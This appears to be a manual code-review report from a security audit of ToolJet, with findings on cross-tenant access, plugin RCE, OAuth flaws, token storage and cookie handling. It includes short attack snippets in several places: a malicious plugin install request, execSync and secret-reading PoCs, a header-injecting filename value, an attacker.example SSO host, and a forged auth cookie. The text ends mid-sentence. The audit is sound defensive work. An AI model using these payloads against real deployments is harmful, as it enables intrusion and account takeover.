# CODE_REVIEW.md — ToolJet Security Audit (Stage 3: Manual Code Review)

Companion to `RECON.md` (architecture map) and `SAST.md` (SAST sweep).
Same commit (`8ce1dcca8`, branch `develop`). All paths relative to repo root.

This stage focuses on issues scanners typically miss: cross-tenant access,
privilege escalation, query/code-execution boundaries, secret-handling
mistakes, webhook/integration weaknesses, self-hosted defaults, and
race/TOCTOU hazards. Each finding lists the precise code paths, an attack
scenario, the affected files/lines, the likely impact, and a validation
plan for stage 4.

Findings are numbered `M1..Mn` (Manual). Where a stage-2 SAST finding is
extended or contradicted, the SAST id is referenced.

---

## 1. Confirmed code paths worth validating in stage 4

The following call graphs were re-walked and are the foundation for every
finding below. Future PoCs should hit these same entry points.

| # | Entry point | Guard chain | Service path | Sink |
|---|---|---|---|---|
| C1 | `POST /api/data-queries/data-sources/:dataSourceId/versions/:versionId` (CREATE) | `JwtAuth + ValidateAppVersion + ValidateQueryApp + AppFeatureAbility + ValidateQuerySource + DataSourceFeatureAbility` | `data-queries/controller.ts:50` → `service.create` | `dataSourceRepository.findById(dataSourceId)` (no org) at `data-queries/guards/validate-query-source.guard.ts:43` |
| C2 | `GET /api/data-queries/:dataSourceId/list-tables/:environmentId` | `JwtAuth + ValidateQuerySource + DataSourceFeatureAbility` | `data-queries/controller.ts:151` → `service.listTablesForApp` | same guard / same repo as C1 |
| C3 | `POST /api/onboarding/setup-super-admin` | `FirstUserSignupGuard + FeatureAbilityGuard` | `onboarding/controller.ts:42` → `setupFirstUser` | `licenseCountsService.getUsersCount === 0` (DB count, not a persistent setup flag) |
| C4 | `POST /api/plugins/install` | `JwtAuth + FeatureAbilityGuard` | `plugins/controller.ts:32` → `pluginsService.install` → `fetchPluginFilesFromRepo(repo)` | `runInNewContext(decoded, sandbox)` at `data-sources/services/plugin-selector.service.ts:194` |
| C5 | `POST /api/oauth/sign-in/:configId` | unauthenticated | `oauth/service.ts:84-104` (config lookup by id) | `gitOAuthService.signIn` reads `configs.hostName` and calls `got(<hostName>/api/v3/user)` at `git-oauth.service.ts:11-18` |
| C6 | `POST /api/webhooks/workflows/:idOrName/trigger-async` (workflow webhook — EE controller) | `WebhookGuard` (`licensing/guards/webhook.guard.ts:11-150`) | bearer-token equality, no HMAC | enqueue/execute workflow |
| C7 | `POST /api/files/:id` GET path | `JwtAuth + FeatureAbilityGuard` | `files/service.ts:10-22` | `Content-Disposition: inline; filename="${file.filename}"` no escape, `Content-Type: image` |
| C8 | Public-app render | `AppAuthGuard` (`apps/guards/app-auth.guard.ts:33-49`) → ability short-circuit `app/guards/ability.guard.ts:111-114` | various downstream features | features without `shouldNotSkipPublicApp` are anonymous |
| C9 | `POST /api/v2/resources/import` | `JwtAuth + FeatureAbilityGuard` | `import-export-resources/service.ts` → `app-import-export.service.ts:633` | imports plugin-id references; sets data-source `kind` from JSON |
| C10 | Workflow / data-query JS template eval | per-request | `data-queries/util.service.ts:495` `getQueryVariables` → `lib/utils.ts:resolveCode` | `isolated-vm` script run; `wrapInIIFE: false` for top-level templates |

---

## 2. Finding candidates

Each finding lists: **Scenario** — concrete attack flow.
**Files/lines** — exact citations.
**Impact** — security consequence.
**Validation plan** — what stage 4 should run/observe to confirm.

### M1 — Cross-tenant data-source action via `:dataSourceId` (P0, High confidence)

Extends SAST.md A2.

**Scenario.** User U is a member of orgs A and B. U presents a valid JWT
with `organizationIds: [A, B]`, picks `tj-workspace-id: A`, and calls one
of:
- `POST /api/data-queries/data-sources/<DS-OF-ORG-C>/versions/<VID-OF-ORG-A>`
- `GET  /api/data-queries/<DS-OF-ORG-C>/list-tables/<ENV-OF-ORG-A>`

The guard at `validate-query-source.guard.ts:43` calls
`dataSourceRepository.findById(dataSourceId)` — `repository.ts:125-132`
queries by `id` only, no `organizationId` filter. The downstream
`DataSourceFeatureAbilityGuard` (`data-queries/ability/data-source/guard.ts`)
loads U's permissions for org A and tests
`resourcePermissions.usableDataSourcesId.includes(request.tj_resource_id)`
(`data-queries/ability/data-source/index.ts:56-58, 89-92`). Permission rows
themselves are scoped to `organizationId` by
`ability/util.service.ts:99` (`groupPermissions.organizationId = :organizationId`),
where `organizationId` is the user's *current* workspace (A) — **not** the
data source's. The permission check therefore loads A's
`usableDataSourcesId`, which never contains a DS belonging to org C. Where
the OR-merge bug bites is when *any* group U belongs to has
`isAllUsable=true` (a "default" group with all-DS access in org A) — the
rule degenerates to "U can use any data-source id" without re-checking the
DS's org.

**Files/lines.**
- `server/src/modules/data-queries/guards/validate-query-source.guard.ts:43`
- `server/src/modules/data-sources/repository.ts:125-132` (findById no-org)
- `server/src/modules/data-queries/ability/data-source/index.ts:32, 56-58, 89-92`
- `server/src/modules/ability/util.service.ts:99` (group-perm scoping)
- `server/src/modules/data-queries/controller.ts:50, 151`

**Impact.** Cross-tenant **read** of foreign data-source schema (list-tables)
and **write** of new queries against foreign credentials — i.e. a builder in
org A can list/discover and *execute* queries against credentials owned by
org C if they can guess the DS UUID. UUID guessing is hard, but DS UUIDs
leak via app/version exports, audit logs, and any admin UI that lists global
data sources.

**Validation plan.** With two seeded orgs A/C and an in-A user that holds
`isAllUsable` in *some* group: (1) seed a Postgres DS in C and capture its
UUID, (2) issue the LIST_TABLES request with U's token and the C-UUID, (3)
expect 200 with C's schema — proves cross-tenant. Repeat for the CREATE
path and confirm a row lands in `data_queries` referencing the foreign DS.

### M2 — Marketplace plugin install → host RCE via `vm.runInNewContext` (P0, High)

**Scenario.** A workspace admin posts:

```http
POST /api/plugins/install
{ "id": "evil", "name": "Evil", "repo": "attacker/evil-tj-plugin" }
```

`pluginsUtilService.fetchPluginFilesFromRepo(repo)`
(`plugins/util.service.ts:79-113`) fetches
`https://api.github.com/repos/${repo}/releases/latest`, then downloads the
attacker-controlled `assets[0].browser_download_url` and stores it as the
plugin's `index` file. When any data source in the workspace is later
configured to use this plugin kind, `plugin-selector.service.ts:39-200`
loads it via:

```ts
const sandbox = createContext({
  ...global,
  module: moduleWrapper,
  exports: moduleWrapper.exports,
  require: require,         // host require
  process: process,         // host process
  console, Buffer, fetch, crypto, ..., global,
});
runInNewContext(decoded, sandbox);
```

`vm.runInNewContext` is **not** a security boundary — Node's docs explicitly
warn against using it as one — and even if it were, `require`, `process`,
and `global` are passed through unredacted. The fetched JS therefore runs
with full host privilege: `require('child_process').execSync(...)`,
`process.env.LOCKBOX_MASTER_KEY`, filesystem read/write, network egress.

**Files/lines.**
- `server/src/modules/plugins/controller.ts:32-36` (route)
- `server/src/modules/plugins/service.ts:24-48` (install path)
- `server/src/modules/plugins/util.service.ts:79-113` (`fetchPluginFilesFromRepo`)
- `server/src/modules/data-sources/services/plugin-selector.service.ts:39-200`
  (sandbox composition + `runInNewContext` at line 194)

**Impact.** An admin (CE has no plugin-marketplace approval flow) can
trigger arbitrary code execution on the ToolJet container. This includes
read of `LOCKBOX_MASTER_KEY` (decrypts every credential), `SECRET_KEY_BASE`
(forge JWTs), `PGRST_JWT_SECRET` (impersonate any TJDB role), and direct
exec into the workflow runner. Also: the sandbox is shared across all
plugin loads — a poisoned plugin can pollute later plugins.

**Validation plan.** Stand up a local instance, install a plugin from a
fork that includes `console.log(process.env.LOCKBOX_MASTER_KEY)` in
`dist/index.js`, configure a data source of that kind, and observe the
secret in container logs. Then PoC with `child_process.execSync('id')` to
confirm RCE.

**Note.** `fetchPluginFilesFromS3` (line 116-139) goes to the official
marketplace bucket, but `repo` in the body short-circuits to GitHub. There
is no allowlist on the `repo` value.

### M3 — `resolveCode` exposes `require` callback when state contains it (P0, High)

Extends SAST.md R5.

**Scenario.** `lib/utils.ts:46-49` loops over the global state passed into
the isolate and **specifically** binds anything keyed `require` as an
`ivm.Callback`:

```ts
Object.entries(globalState).forEach(([key, value]) => {
  if (typeof value === 'function' && key === 'require') {
    context.global.setSync(key, new ivm.Callback(value as (...args: any[]) => any));
  } else {
    ...
  }
});
```

Code that runs inside the isolate can therefore call `require('fs')`,
`require('child_process')`, etc. — **provided** the caller's `state` object
already contains `require`. Stage-4 question: does any caller pass a state
that includes `require`?

The callers I confirmed (`data-queries/util.service.ts:495 getQueryVariables`,
workflow processors) pass `state` derived from app/workflow runtime values,
which do not naturally include `require`. **However**, the workflow
JS-step bundle (`bundleContent`, line 80) installs a *secure* `global.require`
shim (`utils.ts:91-101`) that allowlists `WorkflowPackages[name]`. The
unsafe-`require` branch at line 47-49 is the *unmitigated* path: any
caller who decides to hand `require: require` to `resolveCode` (a refactor,
or a future EE feature, or a marketplace plugin author calling
`getQueryVariables` directly) opens host `require` to user code.

**Files/lines.** `server/lib/utils.ts:46-49`, `:91-101`, `:166-178` (template
expression path), `:180-219` (`getQueryVariables`).

**Impact.** Latent RCE primitive. If exposed, this is full host
privilege. The cost of removing the special-case is one if-branch.

**Validation plan.** Grep every caller of `resolveCode` and `getQueryVariables`
across the monorepo and confirm none currently pass `require` in
`state`/`customObjects`. Recommend deleting lines 47-49 outright.

### M4 — `context.global.derefInto()` aliases the isolate's global onto itself (P1, Medium)

**Scenario.** `lib/utils.ts:65` does:

```ts
context.global.setSync('global', context.global.derefInto());
```

`derefInto` returns a host-side handle that, when set into the same context,
makes `global === globalThis` inside the isolate. This is **not** an escape
on its own (isolated-vm marshals values through `Reference`/`ExternalCopy`),
but it gives sandboxed code a stable `global` object that persists across
`script.runSync` invocations when the isolate/context are reused (the
`providedIsolate`/`providedContext` path at line 24-25, exercised by
workflow execution). User code in expression #1 can mutate `global.foo`,
expression #2 reads it back — a covert channel between query templates in
the same workflow. With `wrapInIIFE: false` on template evaluation (line
176), this is a one-line setup for prototype pollution: `global.Object.prototype.x = ...`.

**Files/lines.** `server/lib/utils.ts:65, 176`.

**Impact.** Prototype pollution & covert state leakage between template
evaluations sharing a context. Not RCE on its own; useful step for chaining
into M3 if a future change adds host bridges.

**Validation plan.** Build a workflow with two JS-bound steps that share an
isolate; in step 1 execute `Object.prototype.foo = 'leaked'`; in step 2
execute `({}).foo` and observe `'leaked'`. If reproducible, log a finding
even though no immediate RCE.

### M5 — Public-app authorization short-circuit on an open `MODULE_INFO` table (P0, High)

Extends SAST.md A4.

**Scenario.** `app/guards/ability.guard.ts:111-114`:

```ts
if (app?.isPublic && !featureInfo.shouldNotSkipPublicApp) {
  return true;
}
```

The denylist is per-feature, opt-in. The current `MODULE_INFO` aggregate
(`app/constants/module-info.ts`) imports 47 feature dictionaries; very few
opt in. Any feature reachable from the public-app routes that omits
`shouldNotSkipPublicApp` is anonymously executable provided the request URL
references an `:appId`/`:slug` of a public app — which `app-auth.guard.ts:49`
also stamps `tj-workspace-id` for, removing the workspace mismatch barrier.

**Files/lines.**
- `server/src/modules/app/guards/ability.guard.ts:111-114`
- `server/src/modules/apps/guards/app-auth.guard.ts:33-49`
- `server/src/modules/app/constants/module-info.ts:56-101` (aggregate)

**Impact.** Anonymous reads/mutations on whichever feature lacks the
opt-in. Walking the table at stage 4 will produce the precise list. The
SAST entry already noted that data-sources/data-queries have *some* opt-in
features but not all of them.

**Validation plan.** Script: import every `feature.ts` in `server/src/modules/*/constants/`,
print rows where `shouldNotSkipPublicApp` is missing/falsy and `isPublic`
is also falsy and `isSuperAdminFeature` is falsy. Hit each route against a
public app's slug + a fresh anonymous browser (no JWT). Triage the responses.

### M6 — Public-app guard stamps `tj-workspace-id` from the slug, ignoring user (P1, High)

Extends SAST.md A3.

**Scenario.** `app-auth.guard.ts:33-49` looks up the app by slug only (no
org filter), then sets `request.headers['tj-workspace-id'] = app.organizationId`
**before** falling back to JWT. For an authenticated user U in org A
visiting a public app whose home org is B, the request executes as if U
*chose* org B. Combined with M5 and any feature whose ability check trusts
`request.headers['tj-workspace-id']` (rather than re-validating via the
JWT's `organizationIds` array), an authenticated user can perform
permitted-on-public-apps actions in a workspace they are not a member of.

**Impact.** Tenant-context spoofing for public-app routes. Whether this
escalates beyond M5 depends on whether downstream services treat the
stamped header as authoritative for credential or environment selection.

**Validation plan.** Add log instrumentation in `app-environments` and
`data-sources` services to print the `organizationId` value used for
credential lookup. Trigger a public-app data query as a foreign-org user.
Check whether B's credentials are decrypted and used.

### M7 — Workflow webhook guard: no HMAC, no replay protection, fallback path probes a name (P1, Medium-High)

Extends SAST.md A7/A8.

**Scenario.** `licensing/guards/webhook.guard.ts:113-149`:
- Authentication is **plaintext bearer-token equality** (line 121:
  `if (token === workflowApp.workflowApiToken) return true;`). Non-constant
  time. The token sits in `apps.workflow_api_token` as cleartext (no hash).
- No timestamp/nonce/replay header. Any captured request is replayable
  forever.
- The lookup at line 27-33 accepts either UUID or `name`. With a guessable
  name (e.g., `daily-payouts`) plus a timing-leaky equality, a remote
  attacker can grind the token byte-by-byte against a public host. The
  guard also has no per-IP rate limit (the `ThrottlerModule` registered at
  `workflows/module.ts:120` covers a different controller).

**Files/lines.**
- `server/src/modules/licensing/guards/webhook.guard.ts:27-33, 113-132, 137-149`

**Impact.** Anyone who has ever observed a valid webhook URL+token replays
it indefinitely; brute force of `workflowApiToken` is feasible against a
known workflow name (timing oracle). Triggers cause real workflow runs
with admin-set queries against real data sources.

**Validation plan.** Use `crypto.timingSafeEqual` audit; capture a webhook
request and replay; attempt name-based lookup against a guessable name.

### M8 — OAuth callback has no `state`/CSRF binding; SSO host is per-org config (P1, High)

Extends SAST.md S10.

**Scenario.** `oauth/service.ts:64-356 signIn` accepts `ssoResponse.state`
(`oauth/interfaces/ISSOResponse.ts`) but never validates it against a
server-stored or signed value. An attacker can craft a cross-site CSRF
flow: victim clicks attacker's `/oauth/sign-in/:configId?state=...`, code
returns from the IdP through ToolJet, and the resulting `Set-Cookie:
tj_auth_token=...` lands on the victim's browser scoped to ToolJet — but
because there's no state check, the *attacker* can race the callback with
their own code (forged or replayed) and bind the victim's session to the
attacker's identity. ToolJet's auth cookie issuance (`session/util.service.ts:106-122`)
makes this practical, especially under `ENABLE_PRIVATE_APP_EMBED=true`
(`SameSite=none`).

Compounding: `git-oauth.service.ts:11-18` builds the IdP host from
`configs.hostName`, a per-org SSO config. A workspace admin can set
`hostName: https://attacker.example/` on a Git SSO config. ToolJet then
exchanges the code at the attacker's `/login/oauth/access_token` and reads
`/api/v3/user` and `/api/v3/user/emails`, both attacker-controlled. The
attacker returns `{email: victim@victim.tld, primary: true, verified: true}`.
Combined with `auth/oauth/service.ts:171, 247-269`'s "find by email"
matching, an attacker who can *plant* an SSO config in a workspace can
mint a session for any email they pick — a full account-takeover primitive
in any workspace where Git SSO is enabled.

**Files/lines.**
- `server/src/modules/auth/oauth/service.ts:64-104, 117-131, 165-194, 247-270`
- `server/src/modules/auth/oauth/util-services/git-oauth.service.ts:11-62`
- `server/src/modules/login-configs/util.service.ts:99-112`

**Impact.** State-less OAuth is CSRF/login-fixation; per-org `hostName`
is direct account takeover when the attacker can edit SSO config. Both
are high-impact for self-hosted SSO deployments.

**Validation plan.** Capture an OAuth callback with `state` mutated; show
the server accepts it. Stand up a `nginx` host that returns
`{login: 'attacker', email: 'admin@victim.tld'}` from `/api/v3/user`,
configure Git SSO at that host, and observe the resulting login.

### M9 — Forgot-password & invitation tokens: no expiry, no hash at rest, no rate limit (P1, High)

Extends SAST.md A5.

**Scenario.** `auth/service.ts:238-261 forgotPassword`:
- Issues `uuid.v4()` and stores **plaintext** in `users.forgot_password_token`.
- No `forgotPasswordTokenExpiresAt` column, no expiry check in
  `resetPassword` (`auth/service.ts:215-236`).
- No rate limit on the route (`auth/controller.ts` POST `/forgot-password`).
- The user-enumeration mitigation (line 240-242: `if (!user) return;`)
  does not equalise timing — DB hit + bcrypt compare would help, neither
  is done on the not-found branch.

For invitations: `organization_users.invitationToken` and
`users.invitationToken` are plaintext (`server/src/entities/organization_user.entity.ts:37`,
`user.entity.ts:101-104`); no expiry; the `acceptOrganizationInvite` flow
(`onboarding/service.ts:398-461`) clears the token only on success.
`acceptOrganizationInvite` activates the invited row based purely on the
token; it never re-checks that the *current* inviter still has the role
they had at issue time, and any party that holds the token is the invitee
(no JWT required on this route).

**Files/lines.**
- `server/src/modules/auth/service.ts:215-261`
- `server/src/modules/onboarding/service.ts:398-461`
- `server/src/modules/auth/controller.ts` (no `@Throttle`)
- `server/src/entities/{user,organization_user}.entity.ts`

**Impact.** A read-only DB compromise (backup, rogue admin, log accident)
yields working reset/invite links indefinitely. No hashing means no
"compromise window" — the snapshot is the keys. Indirect: the inviter's
demotion does not retro-cancel pending invites with elevated roles.

**Validation plan.** Issue a forgot-password, sleep 30 days, attempt
reset — succeeds. Demote the inviter; have invitee accept; verify the
elevated role is granted.

### M10 — Folder update without org scope (P1, High)

**Scenario.** `folders/service.ts:42`:

```ts
return manager.update(Folder, { id: folderId }, { name: folderName });
```

No `organizationId` in the WHERE clause, in contrast to `deleteFolder`
(line 53-58) which **does** add `organizationId: user.organizationId`. The
ability guard for the update route gates by feature/role but the actual
write is keyed on `id` only; if a builder learns a foreign tenant's folder
UUID, they can rename it.

**Files/lines.** `server/src/modules/folders/service.ts:37-51` (update vs.
55-58 delete).

**Impact.** Write across tenants on a single record. Limited blast
radius (folder rename) but it's a clear class-A bug and the kind of
thing scanners miss because the IDOR is in the SQL, not the route.

**Validation plan.** With two seeded orgs and a folder UUID from org B
known to a user in org A, issue `PUT /api/folders/:id`. Confirm B's row
mutates.

### M11 — `editor`-role can toggle `apps.is_public` and the slug (P1, Medium)

**Scenario.** `apps/ability/app.ability.ts:81` grants
`FEATURE_KEY.APP_PUBLIC_UPDATE` to anyone with `FEATURE_KEY.UPDATE` — i.e.
editors. The endpoint at `apps/controller.ts` `PUT /apps/:id/public`
flips `apps.is_public`. There is no separate "publish" gate. Combined
with the slug being a globally-unique handle (used by `app-auth.guard`
for anonymous lookup), an editor can:
1. Toggle the app public.
2. Change the slug (same ability scope) to a guessable, branded handle.
3. Slug-squat names that should belong to other orgs (because slug
   uniqueness is global, not per-org).

**Files/lines.**
- `server/src/modules/apps/ability/app.ability.ts:81`
- `server/src/modules/apps/controller.ts` (`PUT :id/public`, slug update)
- `server/src/entities/app.entity.ts` (`slug` unique constraint)

**Impact.** An org-internal editor publishes apps that admins did not
intend to publish; cybersquatting on slugs that future tenants might
want.

**Validation plan.** Assign editor role; flip `is_public`; observe app is
reachable anonymously.

### M12 — Group-permission "addUsersToGroup" with `allowRoleChange` silently elevates END_USER → BUILDER (P2, Medium)

**Scenario.** `group-permissions/util.service.ts:271-289` exposes an
`allowRoleChange: true` flag that, when set, calls
`changeEndUserToEditor()` on each promoted userId. The route is
admin-gated (FeatureAbilityGuard requires admin), so this is admin-only
— but admin-only mass-promotion is a privilege-escalation amplifier in
multi-org deployments where workspace admins are not super-admins. There
is no per-user gate beyond "the caller is an admin"; no audit-log diff;
no email notification to the promoted user.

**Files/lines.**
- `server/src/modules/group-permissions/util.service.ts:271-289`

**Impact.** Quiet bulk promotion from END_USER (no app-builder access)
to BUILDER (full data-source/query authoring) by any workspace admin.

**Validation plan.** Send `POST /api/group-permissions/:id/users` with a
mix of END_USER ids and `allowRoleChange: true`; verify role rows flip.

### M13 — Marketplace-plugin install + RCE chain via unauthenticated public app (P0, Medium)

**Scenario.** Compose M5 + M2: if `plugins:install` is reachable through
the public-app shortcut (i.e., its `MODULE_INFO` entry lacks
`shouldNotSkipPublicApp`), an *anonymous* visitor on a public app could
install a plugin pointing at an attacker repo. Likely the plugin install
feature *is* admin-gated by `MODULE_INFO`, but stage 4 must walk the
table and confirm — the same pattern (M5) bites once it doesn't.

**Files/lines.** Same as M2 + M5.

**Impact.** Anonymous host RCE if the table omits the flag.

**Validation plan.** Print the `MODULE_INFO[plugins]` rows. If `INSTALL`,
`UPDATE`, `RELOAD`, `INSTALL_DEPENDENT_PLUGINS` lack
`shouldNotSkipPublicApp`, attempt install on a public-app slug with no
JWT.

### M14 — Set-Cookie tossing via REST connector upstream → session fixation (P0, High)

Extends SAST.md S8.

**Scenario.** `data-queries/util.service.ts:440-478 setCookiesBackToClient`
forwards every upstream `Set-Cookie` through `response.cookie(name, value, options)`
without filtering the cookie name. An attacker-controlled REST upstream
returns `Set-Cookie: tj_auth_token=ATTACKER_JWT; HttpOnly; Path=/`.
ToolJet sets that cookie scoped to the ToolJet origin; the next request
from the victim's browser carries the attacker's JWT, logging the victim
into the attacker's account. The victim's data — uploads, credentials,
notes — flow into the attacker's account.

**Files/lines.**
- `server/src/modules/data-queries/util.service.ts:440-478`
- `server/src/modules/session/util.service.ts:106-122` (cookie shape)

**Impact.** Account takeover via session fixation, anyone who can set up
a public app or builder query that hits an attacker REST URL.

**Validation plan.** Spin a local HTTPS endpoint that responds with
`Set-Cookie: tj_auth_token=...`. Run a query through ToolJet against it
and inspect the resulting `Set-Cookie` on the browser.

### M15 — `Set-Cookie` filter is prefix-only; misses hyphen and PAT-cookie variants (P1, Medium)

**Scenario.** `data-queries/util.service.ts:130-152` (forward path) filters
client cookies by `cookie.startsWith('tj_auth_token=')`. A future cookie
named `tj-auth-token` (hyphen) or `tj_auth_token_pat` (extension), or
**any other ToolJet cookie that contains credential material**, slips
through and is forwarded to upstream. Conversely on the inbound path
(M14), there is *no* filter — any `Set-Cookie` is accepted.

**Files/lines.** `server/src/modules/data-queries/util.service.ts:130-152, 440-478`.

**Impact.** Latent — biting once any sibling cookie exists. Combined
with M14 it is the same primitive expressed twice: cookies are not
treated as principals.

**Validation plan.** Grep all `res.cookie`/`response.cookie` invocations;
list every ToolJet cookie name; show that the prefix filter misses any
other names introduced in the future.

### M16 — `users.sso_user_info` plaintext in DB and in API response (P1, Medium)

**Scenario.** SSO callbacks store the IdP `userinfo` (which can include
provider tokens, depending on connector) in `user_details.sso_user_info`
as a plain JSON column. `session/util.service.ts:200-215`
(`getPermissionDataToAuthorize`) returns this column as `ssoUserInfo` in
the login response decamelized. If any SSO connector ever stores the
access/refresh token (Git OAuth's userinfoResponse includes the
`access_token` per `git-oauth.service.ts:42`), the token leaks (a) on
every login response, (b) in any DB dump.

**Files/lines.**
- `server/src/entities/user_details.entity.ts:27-28`
- `server/src/modules/auth/oauth/util-services/git-oauth.service.ts:36-42`
- `server/src/modules/session/util.service.ts:200-215`

**Impact.** Leak of provider OAuth tokens (Git), which themselves can be
used to read repos / impersonate the user.

**Validation plan.** Dump the JSON column for a freshly Git-SSO'd user
and inspect for `access_token`. Compare with `authorize` API response.

### M17 — `apps.workflow_api_token` stored plaintext (P1, Medium)

**Scenario.** Workflow webhook tokens are equality-compared
(`webhook.guard.ts:121` `token === workflowApp.workflowApiToken`),
implying plaintext at rest in `apps.workflow_api_token`. Any DB read
yields a working webhook trigger forever (no rotation, no revocation
flow surfaced). This is the standard advisory: store a hash, compare via
`crypto.timingSafeEqual(sha256(presented), stored_hash)`.

**Files/lines.**
- `server/src/entities/app.entity.ts` (column `workflow_api_token`)
- `server/src/modules/licensing/guards/webhook.guard.ts:121`

**Impact.** DB read → permanent webhook execution capability across all
workflows.

**Validation plan.** Confirm the column is `text`/`varchar`, no hash.
Confirm there is no path that updates it post-creation.

### M18 — Audit log `metadata` field includes the request body for data-source updates (P1, Medium)

**Scenario.** `data-sources/service.ts` (around lines 140-181 in update
flows) sets `RequestContext` audit metadata to
`{ updatedFields: Object.keys(updateDataSourceDto), metadata: updateDataSourceDto }`.
`updateDataSourceDto` arrives plaintext on the wire (the encryption pass
happens *server-side* before storage). Logging it in audit metadata
preserves the plaintext credential in the audit table — which is one of
the few tables that, by design, stores user-readable history and is
exported by the audit-log endpoints.

**Files/lines.**
- `server/src/modules/data-sources/service.ts:140-181`
- `server/src/entities/audit_log.entity.ts` (`resourceData` column)

**Impact.** Plaintext credentials reachable to audit-log readers, who are
typically broader than data-source admins.

**Validation plan.** Update a Postgres DS with a new password via API.
Inspect the `audit_logs` row; confirm the password lands in `resource_data`.

### M19 — File serve: response splitting + MIME confusion + no org filter (P1, Medium)

Extends SAST.md K6/F1.

**Scenario.** `files/service.ts:10-22` streams `file.data` with
`Content-Disposition: inline; filename="${file.filename}"`. `file.filename`
comes from DB without escaping; a row with `filename: x"\r\nSet-Cookie: a=b`
splits the response. `Content-Type: image` is hard-coded (not even a real
MIME, but most browsers will sniff the body). With CSP allowing
`unsafe-inline` (`bootstrap.helper.ts:233-280`), an SVG/HTML body served
this way executes JS scoped to the ToolJet origin.

`files/repository.ts:21-29 getOne(id)` has no org filter; the route's
ability check is the only barrier, and `MODULE_INFO[files][GET]` may not
opt into `shouldNotSkipPublicApp` (M5 applies).

**Files/lines.**
- `server/src/modules/files/service.ts:10-22`
- `server/src/modules/files/repository.ts:21-29`

**Impact.** Stored XSS scoped to the ToolJet origin (steals
`tj_auth_token`-equivalent capabilities on session-cookie-using flows;
pivots into M14).

**Validation plan.** Insert a row with a header-injecting filename and an
SVG `<script>` body. Fetch via `/api/files/:id` and observe the response
in a browser DOM.

### M20 — Race: invitee accepts after inviter demotion; role frozen at issue time (P2, Medium)

**Scenario.** Admin in org A invites user U as `admin`. Super-admin demotes
the inviter to `viewer` in org A. U accepts the invite; `acceptOrganizationInvite`
(`onboarding/service.ts:398-461`) does not re-validate that the inviter
*currently* has the right to grant `admin`. The
`organization_users.role`/`group_permissions` membership rows referenced
on the invite row are activated unchanged.

**Files/lines.**
- `server/src/modules/onboarding/service.ts:398-461`
- `server/src/modules/organization-users/util.service.ts` (invite issuance)

**Impact.** Stale-authorization elevation. Magnitude depends on whether
admins regularly hand out `admin` invites; likely rare but real.

**Validation plan.** Issue a high-role invite; demote the inviter;
accept; check resulting role.

### M21 — Group removal does not invalidate sessions; 10-day session window (P2, Medium)

**Scenario.** No code path exists that invalidates `user_sessions` rows
on group-permission removal. `USER_SESSION_EXPIRY` defaults to 10 days
(`session/util.service.ts:299-300`) and the cookie itself lasts 2 years
(`session/util.service.ts:110`). A user removed from a group continues to
exercise the cached permissions until their next session refresh; though
ability checks happen per-request, the request still authenticates
(JWT + session row), and the per-request permissions load from
`group_permissions` — which **does** reflect the removal — so this is
mostly fine for permission revocation. **What it doesn't reflect:** the
group rename or org-disable. And cookies persist for 2 years even after
account deletion.

**Files/lines.**
- `server/src/modules/session/util.service.ts:106-122, 299-346`

**Impact.** Operational rather than primary auth bypass. Worth flagging
for compliance audits; the practical attack surface is "ex-employee
session continues to function for up to 10 days after removal in any
caching path that survives group-permission updates" — which the
in-memory caches in `inMemoryCache/` may exhibit. Stage 4 should sweep
that module.

**Validation plan.** Add a user, capture cookie, remove the user,
attempt actions; map which actions still succeed for ≤ 10 days.

### M22 — `Math.random()` for password chars + `console.log` of randomBytes (P0, High)

Re-confirms SAST K1/C5 with the broader picture.

**Scenario.** `helpers/tooljet_db.helper.ts:282-289` uses `Math.random()`
to choose four mandatory password chars and then *prints*
`crypto.randomBytes(...)` to stdout. Container logs (default
docker-compose, default journald) are reachable to anyone with
infrastructure access; the printed bytes derive the rest of the password.
Combined with the deterministic `Math.random()` chars, the resulting
TJDB Postgres role password is fully recoverable by a log reader.

**Files/lines.**
- `server/src/helpers/tooljet_db.helper.ts:282-289`

**Impact.** Tenant Postgres role takeover when logs are exposed.

**Validation plan.** Provision a workspace; tail container stdout;
observe both the bytes and the resulting password row in `pg_authid`.

### M23 — Bull-Board password unset → `express-basic-auth` accepts undefined/empty (P0, High)

Re-states C10 to keep the operational hazard in scope.

**Scenario.** `app/module.ts:151-156` mounts Bull-Board with
`users: { admin: process.env.TOOLJET_QUEUE_DASH_PASSWORD }`. With env
unset, the value is `undefined`; with empty, `""`. `express-basic-auth`
historically accepts the literal undefined coerced to string in some
versions. Either way, default deployments expose `/jobs` to anyone who
can reach the host — which leaks queue payloads (workflow runs include
data-source options).

**Files/lines.** `server/src/modules/app/module.ts:151-156`.

**Impact.** Job-payload disclosure including credentials/headers.

**Validation plan.** Run the docker-compose example without setting
`TOOLJET_QUEUE_DASH_PASSWORD`; curl `/jobs/`.

### M24 — `setup-super-admin` re-runs after DB reset; no persistent setup flag (P2, Medium)

**Scenario.** `onboarding/guards/first-user-signup.guard.ts:15` checks
`licenseCountsService.getUsersCount(ORGANIZATION_INSTANCE_KEY) === 0` —
i.e., **DB user count is zero**. If an operator restores a partial backup
that drops `users` but keeps `instance_settings`, the route reopens.
Persisting a `setup_completed` flag in `instance_settings` and checking
it in addition to the count would close the gap.

**Files/lines.**
- `server/src/modules/onboarding/guards/first-user-signup.guard.ts`

**Impact.** Operator-error-conditioned super-admin re-creation.

**Validation plan.** Truncate `users` only; `POST /api/onboarding/setup-super-admin`
with a fresh email; observe a new instance super-admin.

### M25 — `helpers/utils.helper.ts:isHttpsEnabled` parses `TOOLJET_HOST` literal prefix (P2, Medium)

Re-states SAST C4. **Scenario.** Reverse-proxy deployments often configure
`TOOLJET_HOST=http://internal-host:8082` (because the proxy terminates TLS
upstream of ToolJet). `isHttpsEnabled` returns false; the `Secure` flag
on `tj_auth_token` is omitted; if the proxy ever serves the same path on
plain HTTP (a misconfig), the cookie travels in cleartext. The fix is
either to honour `X-Forwarded-Proto` (with a `trust proxy` setting) or
to make `Secure` env-controlled, not host-string-controlled.

**Files/lines.**
- `server/src/helpers/utils.helper.ts` (`isHttpsEnabled` near line 588)
- `server/src/modules/session/util.service.ts:113-117`

**Validation plan.** Stand up a TLS-terminating nginx in front of a
ToolJet container with `TOOLJET_HOST=http://...`; capture the `Set-Cookie`
on the wire and confirm `Secure` is missing.

### M26 — CORS `origin: true` reflection coupled with credentialed cookies (P0, High)

Re-states SAST C1 with stage-3 specificity. `bootstrap.helper.ts:222`:

```ts
origin: configService.get<string>('ENABLE_CORS') === 'true' || tooljetHost,
```

When the env is the string `'true'`, the boolean `true` is passed to
`enableCors`. Express `cors` then **reflects the request `Origin` header**
into `Access-Control-Allow-Origin` and pairs it with
`Access-Control-Allow-Credentials: true` — which means *any* third-party
